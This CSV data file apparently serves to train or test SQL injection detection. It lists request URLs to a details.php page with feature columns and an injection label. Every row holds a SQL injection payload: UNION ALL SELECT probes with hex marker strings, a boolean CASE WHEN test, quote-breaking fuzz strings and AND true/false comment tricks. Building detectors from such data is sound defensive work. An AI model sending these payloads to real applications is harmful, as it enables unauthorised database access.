full_url,parsed_url,hostname,event_time,sql_keyword,params_length,request_volume,special_chars,values_to_length,injection
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x416e50517173674b784e%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT CONCAT(0x71717a6271,0x416e50517173674b784e,0x717a626271),NULL,NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.543434,4,100,97.8,1,5.0,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4572706a674855436d64%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=5 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x4572706a674855436d64,0x717a626271)-- -&type=?",192.168.43.6,1681395118.54865,4,100,97.8,1,5.0,1
/details.php?prod=-2058%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x506d66476f456a657a627a526a5059615562657455436e647444566954537568566b5254616f7662%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,"/details.php?prod=-2058 UNION ALL SELECT NULL,CONCAT(0x71717a6271,0x506d66476f456a657a627a526a5059615562657455436e647444566954537568566b5254616f7662,0x717a626271),NULL,NULL,NULL-- -&type=?",192.168.43.6,1681395118.558081,4,164,97.8,1,3.048780487804878,1
/details.php?prod=-7371%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x5653424a417755614d564275445672766a7552504e5468686a4b6d4c7a564e536b46586d71476e66%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=-7371 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,0x5653424a417755614d564275445672766a7552504e5468686a4b6d4c7a564e536b46586d71476e66,0x717a626271)-- -&type=?",192.168.43.6,1681395118.612434,4,164,97.8,1,3.048780487804878,1
/details.php?prod=-2416%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C%28CASE%20WHEN%20%284365%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%204365%29%20THEN%201%20ELSE%200%20END%29%2C0x717a626271%29--%20-&type=%3F,"/details.php?prod=-2416 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71717a6271,(CASE WHEN (4365=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4365) THEN 1 ELSE 0 END),0x717a626271)-- -&type=?",192.168.43.6,1681395118.632125,6,635,97.8,1,1.1023622047244095,1
/details.php?prod=5&type=8429,/details.php?prod=5&type=8429,192.168.43.6,1681395120.600657,0,5,97.8,0,0.0,1
/details.php?prod=5&type=%3F.%2C%29.%2C%2C%28%22.%27,"/details.php?prod=5&type=?.,).,,("".'",192.168.43.6,1681395120.606028,0,13,97.8,2,15.384615384615385,1
/details.php?prod=5&type=%3F%27DjwSfm%3C%27%22%3EyFLhiq,"/details.php?prod=5&type=?'DjwSfm<'"">yFLhiq",192.168.43.6,1681395120.611527,0,21,97.8,2,9.523809523809524,1
/details.php?prod=5&type=%3F%29%20AND%204518%3D1491--%20ebZB,/details.php?prod=5&type=?) AND 4518=1491-- ebZB,192.168.43.6,1681395120.718613,1,24,97.8,1,8.333333333333334,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104--%20KXCL,/details.php?prod=5&type=?) AND 5104=5104-- KXCL,192.168.43.6,1681395120.730996,1,24,97.8,1,8.333333333333334,1
